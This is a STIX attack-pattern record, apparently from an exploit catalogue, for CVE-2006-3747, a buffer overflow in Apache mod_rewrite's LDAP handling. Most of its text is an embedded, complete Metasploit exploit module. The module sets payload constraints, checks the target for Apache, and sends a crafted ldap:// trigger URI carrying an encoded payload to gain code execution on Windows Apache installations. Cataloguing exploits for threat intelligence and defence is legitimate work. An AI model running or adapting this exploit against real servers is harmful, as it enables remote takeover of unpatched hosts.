{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fbab1a96-0de9-4638-ab31-6baf6ccc5dec",
    "created": "2024-08-14T16:54:11.533704Z",
    "modified": "2024-08-14T16:54:11.533708Z",
    "name": "Apache Module mod_rewrite LDAP Protocol Buffer Overflow",
    "description": " This module exploits the mod_rewrite LDAP protocol scheme handling flaw discovered by Mark Dowd, which produces an off-by-one overflow. Apache versions 1.3.29-36, 2.0.47-58, and 2.2.1-2 are vulnerable. This module requires REWRITEPATH to be set accurately. In addition the target must have 'RewriteEngine on' configured, with a specific 'RewriteRule' condition enabled to allow for exploitation.  The flaw affects multiple platforms, however this module currently only supports Windows based installations. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/apache_mod_rewrite_ldap.rb",
            "external_id": "apache_mod_rewrite_ldap.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-3747"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/bugtraq/2006-07/0514.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Module mod_rewrite LDAP Protocol Buffer Overflow',\n      'Description'    => %q{\n        This module exploits the mod_rewrite LDAP protocol scheme handling\n        flaw discovered by Mark Dowd, which produces an off-by-one overflow.\n        Apache versions 1.3.29-36, 2.0.47-58, and 2.2.1-2 are vulnerable.\n        This module requires REWRITEPATH to be set accurately. In addition,\n        the target must have 'RewriteEngine on' configured, with a specific\n        'RewriteRule' condition enabled to allow for exploitation.\n\n        The flaw affects multiple platforms, however this module currently\n        only supports Windows based installations.\n      },\n      'Author'         => 'aushack',\n      'References'     =>\n        [\n          [ 'CVE', '2006-3747' ],\n          [ 'OSVDB', '27588' ],\n          [ 'BID', '19204' ],\n          [ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2006-07/0514.html' ],\n          [ 'EDB', '3680' ],\n          [ 'EDB', '3996' ],\n          [ 'EDB', '2237' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n          'AllowWin32SEH' => true\n        },\n      'Privileged'     => true,\n      'Platform'       => ['win'],\n      'Payload'        =>\n        {\n          'Space'    => 636,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\",\n          'EncoderType' => Msf::Encoder::Type::AlphanumUpper,\n          'StackAdjustment' => -3500,\n          'DisableNops'  =>  'True',\n        },\n      'Targets'        =>\n        [\n          [  'Automatic', {} ], # aushack tested OK 20090310 win32\n        ],\n      'DisclosureDate' => '2006-07-28',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('REWRITEPATH', [true, \"The mod_rewrite URI path\", \"rewrite_path\"]),\n        ])\n  end\n\n\n  def check\n    res = send_request_raw({\n      'uri'     => '/',\n      'version' => '1.1',\n    }, 2)\n\n    if (res.to_s =~ /Apache/) # This could be smarter.\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n\n  end\n\n  def exploit\n\n    # On Linux Apache, it is possible to overwrite EIP by\n    # sending ldap://<buf> ... TODO aushack\n\n    trigger = '/ldap://localhost/%3fA%3fA%3fCCCCCCCCCC%3fC%3f%90'\n\n    print_status(\"Sending payload.\")\n    send_request_raw({\n        'uri'     => normalize_uri(datastore['REWRITEPATH']) + trigger + payload.encoded,\n        'version' => '1.0',\n        }, 2)\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-07-28",
    "x_mitre_platforms": [
        "['win']"
    ]
}